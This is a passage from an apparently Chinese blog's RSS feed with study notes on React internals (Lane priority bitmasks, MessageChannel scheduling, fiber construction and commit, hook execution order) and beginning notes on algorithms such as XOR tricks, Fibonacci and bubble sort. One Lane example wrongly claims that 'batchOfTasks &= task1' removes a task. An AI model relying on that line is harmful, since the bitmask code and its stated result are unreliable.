  console<span>.</span><span>log</span><span>(</span><span><span>`</span><span><span>${</span>isMount <span>?</span> <span>'mount'</span> <span>:</span> <span>'update'</span><span>}</span></span><span> num: </span><span>`</span></span><span>,</span> num<span>)</span>

  <span>return</span> <span>{</span>
    <span>click</span><span>(</span><span>)</span> <span>{</span>
      <span>updateNum</span><span>(</span><span>num</span> <span>=></span> num <span>+</span> <span>1</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span>

window<span>.</span>app <span>=</span> <span>schedule</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br></div></div></li>
</ul>
<h2 id="_5-启动模式"> 5. 启动模式</h2>
<ul>
<li>
<p>Legacy 模式：不支持 Concurrent（并发），不可中断渲染。</p>
<div><pre><code>ReactDOM<span>.</span><span>render</span><span>(</span><span>&lt;</span>App <span>/</span><span>></span><span>,</span> document<span>.</span><span>getElementById</span><span>(</span><span>'root'</span><span>)</span><span>,</span> <span>dom</span> <span>=></span> <span>{</span><span>}</span><span>)</span> <span>// 支持 callback 回调，参数是一个 dom 对象</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>Blocking 模式：开启部分 Concurrent 功能，可中断渲染。</p>
<div><pre><code>ReactDOM<span>.</span><span>createBlockingRoot</span><span>(</span>document<span>.</span><span>getElementById</span><span>(</span><span>'root'</span><span>)</span><span>)</span><span>.</span><span>render</span><span>(</span><span>&lt;</span>App <span>/</span><span>></span><span>)</span> <span>// 不支持回调</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>Concurrent 模式：开启所有 Concurrent 功能，可中断渲染。</p>
<div><pre><code>ReactDOM<span>.</span><span>createRoot</span><span>(</span>document<span>.</span><span>getElementById</span><span>(</span><span>'root'</span><span>)</span><span>)</span><span>.</span><span>render</span><span>(</span><span>&lt;</span>App <span>/</span><span>></span><span>)</span> <span>// 不支持回调</span>
</code></pre>
<div><span>1</span><br></div></div></li>
</ul>
<h2 id="_6-优先级管理"> 6. 优先级管理</h2>
<ul>
<li>
<p>3 种类型优先级。</p>
<blockquote>
<ol>
<li>fiber 优先级（LanePriority）：位于 react-reconciler 包，也就是 Lane（车道模型）。</li>
<li>调度优先级（SchedulerPriority）：位于 scheduler 包。</li>
<li>优先级等级（ReactPriorityLevel）：位于 react-reconciler 包中的 SchedulerWithReactIntegration.js，负责上述 2 套优先级体系的转换。</li>
</ol>
</blockquote>
</li>
<li>
<p>Lane（车道模型）：占有低位比特位的 Lane 变量对应的优先级越高。</p>
<blockquote>
<ul>
<li>最高优先级为 SyncLanePriority 对应的车道为 SyncLane = 0b0000000000000000000000000000001。</li>
<li>最低优先级为 OffscreenLanePriority 对应的车道为 OffscreenLane = 0b1000000000000000000000000000000。</li>
</ul>
</blockquote>
<div><pre><code><span>const</span> SyncLane <span>=</span> <span>0b0000000000000000000000000000001</span>
<span>const</span> SyncBatchedLane <span>=</span> <span>0b0000000000000000000000000000010</span>
<span>const</span> InputDiscreteHydrationLane <span>=</span> <span>0b0000000000000000000000000000100</span>
<span>// ...</span>

<span>const</span> task1 <span>=</span> SyncLane<span>,</span>
  task2 <span>=</span> SyncBatchedLane<span>,</span>
  task3 <span>=</span> InputDiscreteHydrationLane

<span>let</span> batchOfTasks <span>=</span> task1 <span>|</span> task2 <span>// =>  0b0000000000000000000000000000011</span>

<span>// 删除单个 task</span>
batchOfTasks <span>&amp;=</span> task1 <span>// => 0b0000000000000000000000000000010</span>
<span>// 增加单个 task</span>
batchOfTasks <span>|=</span> task1 <span>// => 0b0000000000000000000000000000011</span>
<span>// 比较 task1 是否在 group 中</span>
<span>;</span><span>(</span>task1 <span>&amp;</span> batchOfTasks<span>)</span> <span>!==</span> <span>0</span> <span>// => true （task1 &amp; batchOfTasks：0b0000000000000000000000000000011）</span>
<span>// 比较 task3 是否在 group 中</span>
<span>;</span><span>(</span>task3 <span>&amp;</span> batchOfTasks<span>)</span> <span>!==</span> <span>0</span> <span>// => false （task3 &amp; batchOfTasks：0b0000000000000000000000000000000）</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
<li>
<p><a href="https://7kms.github.io/react-illustration-series/main/priority#lane-%E8%BD%A6%E9%81%93%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener noreferrer">图解 React / 优先级管理 - 图解 React</a></p>
</li>
</ul>
<h2 id="_7-调度原理"> 7. 调度原理</h2>
<ul>
<li>
<p>requestHostCallback 请求回调后，通过 MessageChannel 发消息的方式触发 performWorkUntilDeadline 函数，最后执行回调 scheduledHostCallback。</p>
<blockquote>
<p>微任务将在页面更新前全部执行完，达不到将主线程还给浏览器的目的，递归的 setTimeout() 调用会使调用间隔变为 4ms，导致浪费了 4ms（<a href="/memo/JS/#_9-事件循环-event-loop">事件循环（Event Loop）</a>）。所以首选 MessageChannel ，setTimeout 作为 MessageChannel 降级处理。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>let</span> mnCount <span>=</span> <span>0</span>
<span>function</span> <span>mn</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> mc <span>=</span> <span>new</span> <span>MessageChannel</span><span>(</span><span>)</span>
  mc<span>.</span>port1<span>.</span><span>onmessage</span> <span>=</span> <span>(</span><span><span>{</span> data <span>}</span></span><span>)</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>++</span>mnCount<span>,</span> Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> data<span>)</span> <span>// 大部分输出0</span>
    <span>if</span> <span>(</span>mnCount <span>&lt;</span> <span>50</span><span>)</span> <span>mn</span><span>(</span><span>)</span>
  <span>}</span>
  mc<span>.</span>port2<span>.</span><span>postMessage</span><span>(</span>Date<span>.</span><span>now</span><span>(</span><span>)</span><span>)</span>
<span>}</span>
<span>mn</span><span>(</span><span>)</span>

<span>let</span> tnCount <span>=</span> <span>0</span>
<span>function</span> <span>tn</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> startTime <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
  <span>setTimeout</span><span>(</span><span>_</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>++</span>tnCount<span>,</span> Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> startTime<span>)</span> <span>// 前4次输出约为1，第5次开始输出约为5</span>
    <span>if</span> <span>(</span>tnCount <span>&lt;</span> <span>50</span><span>)</span> <span>tn</span><span>(</span><span>)</span>
  <span>}</span><span>,</span> <span>0</span><span>)</span>
<span>}</span>
<span>tn</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><ul>
<li>
<p><a href="https://7kms.github.io/react-illustration-series/main/scheduler/" target="_blank" rel="noopener noreferrer">图解 React / 调度原理 - 图解 React</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6953804914715803678" target="_blank" rel="noopener noreferrer">React Scheduler 为什么使用 MessageChannel 实现 - MoonBall</a></p>
</li>
</ul>
<h2 id="_8-fiber-树构造"> 8. Fiber 树构造</h2>
<ul>
<li>
<p>双缓冲技术：把 ReactElement 转换成 fiber 树的过程中，内存里会同时存在 2 棵 fiber 树。</p>
<blockquote>
<ol>
<li>代表当前界面的 fiber 树（已经被展示出来，挂载到 fiberRoot.current 上）。如果是初次构造（初始化渲染），页面还没有渲染，此时界面对应的 fiber 树为空（fiberRoot.current = null）。</li>
<li>正在构造的 fiber 树（即将展示出来，挂载到 HostRootFiber.alternate 上，正在构造的节点称为 workInProgress）。当构造完成之后，重新渲染页面，最后切换 fiberRoot.current = workInProgress，使得 fiberRoot.current 重新指向代表当前界面的 fiber 树。</li>
</ol>
</blockquote>
</li>
<li>
<p>fiber 树构造循环负责构造新的 fiber 树，构造过程中同时标记 fiber.flags，最终把所有被标记的 fiber 节点收集到一个副作用队列中，这个副作用队列被挂载到根节点上（HostRootFiber.alternate.firstEffect）。此时的 fiber 树和与之对应的 DOM 节点都还在内存当中，等待 commitRoot 阶段进行渲染。</p>
</li>
<li>
<p>fiber 树更新阶段跟踪了创建过程中内存引用的变化情况。与初次构造最大的不同在于 fiber 节点是否可以复用，其中 bailout 逻辑是 fiber 子树能否复用的判断依据。</p>
</li>
<li>
<p><a href="https://7kms.github.io/react-illustration-series/main/fibertree-prepare" target="_blank" rel="noopener noreferrer">图解 React / fiber 树构造 - 图解 React</a></p>
</li>
</ul>
<h2 id="_9-fiber-树渲染"> 9. Fiber 树渲染</h2>
<p>从渲染前、渲染、渲染后三个方面分解了 commitRootImpl 函数。其中最核心的渲染逻辑又分为了 3 个函数，这 3 个函数共同处理了有副作用 fiber 节点，并通过渲染器 react-dom 把最新的 DOM 对象渲染到界面上。</p>
<ol>
<li>
<p>commitBeforeMutationEffects</p>
<blockquote>
<p>dom 变更之前、处理副作用队列中带有 Snapshot（根节点与类组件）、Passive（使用 hook 的函数组件） 标记的 fiber 节点。</p>
</blockquote>
</li>
<li>
<p>commitMutationEffects</p>
<blockquote>
<p>dom 变更、界面得到更新。处理副作用队列中带有 Ref（清空 Ref）、Placement（新增）、Update（更新）、Deletion（删除）、Hydrating 标记的 fiber 节点。</p>
</blockquote>
</li>
<li>
<p>commitLayoutEffects</p>
<blockquote>
<p>dom 变更后，处理副作用队列中带有 Update、Callback（如：this.setState({}, callback)）、Ref（重新设置 Ref） 标记的 fiber 节点。对于 HostComponent 节点，如有 Update 标记，需要设置一些原生状态（focus 等）。</p>
</blockquote>
</li>
</ol>
<ul>
<li><a href="https://7kms.github.io/react-illustration-series/main/fibertree-commit" target="_blank" rel="noopener noreferrer">图解 React / fiber 树渲染 - 图解 React</a></li>
</ul>
<h2 id="_10-状态与副作用"> 10. 状态与副作用</h2>
<ul>
<li>
<p>useState 在 fiber 树构造阶段（render）执行，可以修改 Hook.memoizedState。</p>
</li>
<li>
<p>useLayoutEffect 和 useEffect 均在 fiber 树渲染阶段（commitRoot）执行。</p>
<blockquote>
<ul>
<li>useLayoutEffect 是同步执行的，与 componentDidMount、componentDidUpdate 的调用阶段是一样的。</li>
<li>useEffect 经过了调度中心，所以 useEffect 中的函数是异步执行的（调度中心首选 MessageChannel，setTimeout 降级处理）。</li>
</ul>
</blockquote>
</li>
<li>
<p>输出顺序：1 -&gt; 5 -&gt; 3 -&gt; 7 -&gt; 2 -&gt; 4 -&gt; 6。</p>
<div><pre><code><span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>1</span><span>)</span>

  <span>// 先于 useEffect 注册</span>
  <span>const</span> <span>{</span> port1<span>,</span> port2 <span>}</span> <span>=</span> <span>new</span> <span>MessageChannel</span><span>(</span><span>)</span>
  port1<span>.</span><span>onmessage</span> <span>=</span> <span>(</span><span><span>{</span> data <span>}</span></span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>data<span>)</span>
  port2<span>.</span><span>postMessage</span><span>(</span><span>2</span><span>)</span>

  <span>useLayoutEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>// commitRoot 阶段同步执行</span>
    console<span>.</span><span>log</span><span>(</span><span>3</span><span>)</span>
  <span>}</span><span>)</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>// commitRoot 阶段，通过调度中心执行（MessageChannel || setTimeout）</span>
    console<span>.</span><span>log</span><span>(</span><span>4</span><span>)</span>
  <span>}</span><span>)</span>

  <span>setTimeout</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>6</span><span>)</span><span>)</span>

  Promise<span>.</span><span>resolve</span><span>(</span><span>7</span><span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span>log<span>)</span>

  console<span>.</span><span>log</span><span>(</span><span>5</span><span>)</span>

  <span>return</span> <span><span><span>&lt;</span></span><span>></span></span><span><span><span>&lt;/</span></span><span>></span></span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div></li>
<li>
<p>输出顺序：1 -&gt; 2 -&gt; 5 -&gt; num: 0 -&gt; 1 -&gt; 5 -&gt; num: 1 -&gt; 3 -&gt; 6 -&gt; 6 -&gt; 4。</p>
<blockquote>
<p>render 执行两次，commitRoot 执行一次。</p>
</blockquote>
<div><pre><code><span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>1</span><span>)</span>
  <span>const</span> <span>[</span>num<span>,</span> setNum<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span>

  <span>useState</span><span>(</span><span>_</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>2</span><span>)</span>
    <span>setNum</span><span>(</span>num <span>+</span> <span>1</span><span>)</span> <span>// 初次执行 render 后，再次进入 reconciler 流程</span>
  <span>}</span><span>)</span>

  <span>useLayoutEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>3</span><span>)</span>
  <span>}</span><span>)</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>4</span><span>)</span>
  <span>}</span><span>)</span>

  <span>// 两次 render 即注册两次</span>
  Promise<span>.</span><span>resolve</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>_</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>6</span><span>)</span><span>)</span>

  console<span>.</span><span>log</span><span>(</span><span>5</span><span>)</span>

  <span>return</span> <span><span><span>&lt;</span></span><span>></span></span><span>{</span>console<span>.</span><span>log</span><span>(</span><span>'num:'</span><span>,</span> num<span>)</span><span>}</span><span><span><span>&lt;/</span></span><span>></span></span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div></li>
<li>
<p><a href="https://7kms.github.io/react-illustration-series/main/state-effects" target="_blank" rel="noopener noreferrer">图解 React / 状态与副作用 - 图解 React</a></p>
</li>
</ul>
<h2 id="_11-类组件与函数组件区别"> 11. 类组件与函数组件区别</h2>
<table>
<thead>
<tr>
<th>类组件</th>
<th>函数组件</th>
</tr>
</thead>
<tbody>
<tr>
<td>面向对象编程（OOP）</td>
<td>函数式编程（FP），更方便单元测试，未来趋势</td>
</tr>
<tr>
<td>需要创建实例，会占用一定内存</td>
<td>不需要创建实例，可以节约内存</td>
</tr>
<tr>
<td>烦人的 this</td>
<td>好用的 Hooks（小心闭包）</td>
</tr>
<tr>
<td>拥有完整的生命周期</td>
<td>可通过 Hooks 实现一些生命周期</td>
</tr>
<tr>
<td>主要通过高阶组件（HOC）实现逻辑复用（还可以用继承）</td>
<td>主要通过 Hooks 实现逻辑复用（也可以用 HOC）</td>
</tr>
<tr>
<td>babel 转换后代码更多</td>
<td>babel 转换后代码更少</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>数据结构与算法</title>
      <link>https://www.matrixtheone.ga/web/memo/Structures-Algorithms/</link>
      <guid>https://www.matrixtheone.ga/web/memo/Structures-Algorithms/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">数据结构与算法</source>
      <category>数据结构与算法</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-中点"> 1. 中点</h2>
<ul>
<li><code>mid = L + ((R - L) &gt;&gt; 1)</code></li>
</ul>
<h2 id="_2-异或运算"> 2. 异或运算 ^</h2>
<ul>
<li>
<p>无进位相加，<code>0 ^ N</code>等于 N，<code>N ^ N</code>等于 0，满足交换律与结合律。</p>
<div><pre><code><span>0</span> <span>^</span> <span>7</span> <span>// => 7</span>
<span>7</span> <span>^</span> <span>7</span> <span>// => 0</span>

<span>// 两数交换</span>
<span>let</span> a <span>=</span> <span>3</span><span>,</span>
  b <span>=</span> <span>4</span>

a <span>^=</span> b
b <span>^=</span> a
a <span>^=</span> b
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
<li>
<ol>
<li>数列中只有一个数出现奇数次，其余数出现偶数次，求出现奇数次的数？</li>
</ol>
<div><pre><code><span>const</span> ary <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>,</span> <span>7</span><span>,</span> <span>7</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>,</span> <span>7</span><span>]</span>

<span>let</span> num <span>=</span> <span>0</span>
ary<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span>(</span>num <span>^=</span> i<span>)</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>num<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
<li>
<ol start="2">
<li>数列中有两个数出现奇数次，其余数出现偶数次，求出现奇数次的数？</li>
</ol>
<blockquote>
<p><code>num &amp; (~num + 1)</code> 提取不为零数中最右侧的 1。</p>
</blockquote>
<div><pre><code><span>const</span> ary <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>,</span> <span>7</span><span>,</span> <span>7</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>,</span> <span>7</span><span>,</span> <span>9</span><span>]</span>

<span>let</span> num1 <span>=</span> <span>0</span><span>,</span> <span>// num1 = a ^ b，因为 a !== b，所以 num1 !== 0，num1 必然有一位为 1</span>
  num2 <span>=</span> <span>0</span> <span>// num2 = a or b</span>
ary<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> <span>(</span>num1 <span>^=</span> i<span>)</span><span>)</span>

<span>let</span> rightOne <span>=</span> num1 <span>&amp;</span> <span>(</span><span>~</span>num1 <span>+</span> <span>1</span><span>)</span> <span>// 取出最右侧的 1</span>
ary<span>.</span><span>map</span><span>(</span><span>i</span> <span>=></span> i <span>&amp;</span> rightOne <span>&amp;&amp;</span> <span>(</span>num2 <span>^=</span> i<span>)</span><span>)</span> <span>// 划分 a、b，将 a 或 b 赋值给 num2</span>

console<span>.</span><span>log</span><span>(</span>num2<span>,</span> num1 <span>^</span> num2<span>)</span> <span>// 两数</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
</ul>
<h2 id="_3-master-公式"> 3. master 公式</h2>
<ul>
<li>
<p>作用：剖析递归行为时间复杂度。</p>
</li>
<li>
<p><span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:1em;vertical-align:-0.25em;"></span><span style="margin-right:0.13889em;">T</span><span>(</span><span>n</span><span>)</span><span style="margin-right:0.2778em;"></span><span>=</span><span style="margin-right:0.2778em;"></span></span><span><span style="height:1.095em;vertical-align:-0.345em;"></span><span>a</span><span style="margin-right:0.13889em;">T</span><span>(</span><span><span></span><span><span><span><span style="height:0.6954em;"><span style="top:-2.655em;"><span style="height:3em;"></span><span><span><span>b</span></span></span></span><span style="top:-3.23em;"><span style="height:3em;"></span><span style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span style="height:3em;"></span><span><span><span>n</span></span></span></span></span><span>​</span></span><span><span style="height:0.345em;"><span></span></span></span></span></span><span></span></span><span>)</span><span style="margin-right:0.2222em;"></span><span>+</span><span style="margin-right:0.2222em;"></span></span><span><span style="height:1.0991em;vertical-align:-0.25em;"></span><span style="margin-right:0.02778em;">O</span><span>(</span><span><span>n</span><span><span><span><span style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>d</span></span></span></span></span></span></span></span></span><span>)</span></span></span></span></p>
</li>
</ul>
<blockquote>
<ol>
<li>log(b, a) &gt; d 复杂度为 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:1.138em;vertical-align:-0.25em;"></span><span style="margin-right:0.02778em;">O</span><span>(</span><span><span style="margin-right:0.10903em;">N</span><span><span><span><span style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span style="margin-right:0.01968em;">l</span><span>o</span><span style="margin-right:0.03588em;">g</span><span>(</span><span>b</span><span>,</span><span>a</span><span>)</span></span></span></span></span></span></span></span></span><span>)</span></span></span></span></li>
<li>log(b, a) = d 复杂度为 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:1.0991em;vertical-align:-0.25em;"></span><span style="margin-right:0.02778em;">O</span><span>(</span><span><span style="margin-right:0.10903em;">N</span><span><span><span><span style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>d</span></span></span></span></span></span></span></span></span><span style="margin-right:0.2222em;"></span><span>∗</span><span style="margin-right:0.2222em;"></span></span><span><span style="height:1em;vertical-align:-0.25em;"></span><span style="margin-right:0.01968em;">l</span><span>o</span><span style="margin-right:0.03588em;">g</span><span style="margin-right:0.10903em;">N</span><span>)</span></span></span></span></li>
<li>log(b, a) &lt; d 复杂度为 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:1.0991em;vertical-align:-0.25em;"></span><span style="margin-right:0.02778em;">O</span><span>(</span><span><span style="margin-right:0.10903em;">N</span><span><span><span><span style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>d</span></span></span></span></span></span></span></span></span><span>)</span></span></span></span></li>
</ol>
</blockquote>
<h2 id="_4-斐波那契数列"> 4.斐波那契数列</h2>
<ul>
<li>
<ol>
<li>递归</li>
</ol>
<div><pre><code><span>function</span> <span>fibonacci</span><span>(</span><span>n</span><span>)</span> <span>{</span>
  <span>return</span> n <span>&lt;</span> <span>3</span> <span>?</span> <span>1</span> <span>:</span> <span>fibonacci</span><span>(</span>n <span>-</span> <span>1</span><span>)</span> <span>+</span> <span>fibonacci</span><span>(</span>n <span>-</span> <span>2</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
<li>
<ol start="2">
<li><a href="/note/books/You-Don’t-Know-JS-Vol3/#_4-尾调用">尾调用</a>优化递归</li>
</ol>
<div><pre><code><span>'use strict'</span>
<span>function</span> <span>fibonacci</span><span>(</span><span>n<span>,</span> a <span>=</span> <span>1</span><span>,</span> b <span>=</span> <span>1</span></span><span>)</span> <span>{</span>
  <span>return</span> n <span>&lt;</span> <span>3</span> <span>?</span> b <span>:</span> <span>fibonacci</span><span>(</span>n <span>-</span> <span>1</span><span>,</span> b<span>,</span> a <span>+</span> b<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
<li>
<ol start="3">
<li>循环</li>
</ol>
<div><pre><code><span>function</span> <span>fibonacci</span><span>(</span><span>n</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>n <span>&lt;</span> <span>3</span><span>)</span> <span>return</span> <span>1</span>
  <span>let</span> ary <span>=</span> <span>[</span><span>1</span><span>,</span> <span>1</span><span>]</span>
  <span>let</span> i <span>=</span> n <span>+</span> <span>1</span> <span>-</span> <span>2</span>
  <span>while</span> <span>(</span>i <span>></span> <span>1</span><span>)</span> <span>{</span>
    <span>const</span> <span>[</span>a<span>,</span> b<span>]</span> <span>=</span> <span>[</span>ary<span>[</span>ary<span>.</span>length <span>-</span> <span>2</span><span>]</span><span>,</span> ary<span>[</span>ary<span>.</span>length <span>-</span> <span>1</span><span>]</span><span>]</span>
    ary<span>.</span><span>push</span><span>(</span>a <span>+</span> b<span>)</span>
    i<span>--</span>
  <span>}</span>
  <span>return</span> ary<span>.</span><span>at</span><span>(</span><span>-</span><span>1</span><span>)</span> <span>// ary.slice(-1)[0]</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
</ul>
<h2 id="_5-排序算法"> 5. 排序算法</h2>
<ul>
<li>
<p>1.1 传统冒泡排序</p>
<div><pre><code><span>function</span> <span>bubbleSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>const</span> len <span>=</span> ary<span>.</span>length

  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> len <span>-</span> <span>1</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;</span> len <span>-</span> <span>1</span> <span>-</span> i<span>;</span> j<span>++</span><span>)</span> <span>{</span>
      <span>// 相邻元素两两对比</span>
      <span>if</span> <span>(</span>ary<span>[</span>j<span>]</span> <span>></span> ary<span>[</span>j <span>+</span> <span>1</span><span>]</span><span>)</span> <span>{</span>
        <span>;</span><span>[</span>ary<span>[</span>j<span>]</span><span>,</span> ary<span>[</span>j <span>+</span> <span>1</span><span>]</span><span>]</span> <span>=</span> <span>[</span>ary<span>[</span>j <span>+</span> <span>1</span><span>]</span><span>,</span> ary<span>[</span>j<span>]</span><span>]</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> ary
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
<li>
<p>1.2 改进冒泡排序</p>
<blockquote>
<p>设置一标志性变量 pos，用于记录每趟排序中最后一次进行交换的位置。由于 pos 位置之后的记录均已交换到位，故在进行下一趟排序时只要扫描到 pos 位置即可。</p>
</blockquote>
<div><pre><code><span>function</span> <span>bubbleSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>let</span> i <span>=</span> ary<span>.</span>length <span>-</span> <span>1</span> <span>// 初始时，最后位置保持不变</span>
  <span>while</span> <span>(</span>i <span>></span> <span>0</span><span>)</span> <span>{</span>
    <span>let</span> pos <span>=</span> <span>0</span> <span>// 每趟开始时，无记录交换</span>
    <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;</span> i<span>;</span> j<span>++</span><span>)</span>
      <span>if</span> <span>(</span>ary<span>[</span>j<span>]</span> <span>></span> ary<span>[</span>j <span>+</span> <span>1</span><span>]</span><span>)</span> <span>{</span>
        pos <span>=</span> j <span>// 记录交换的位置</span>
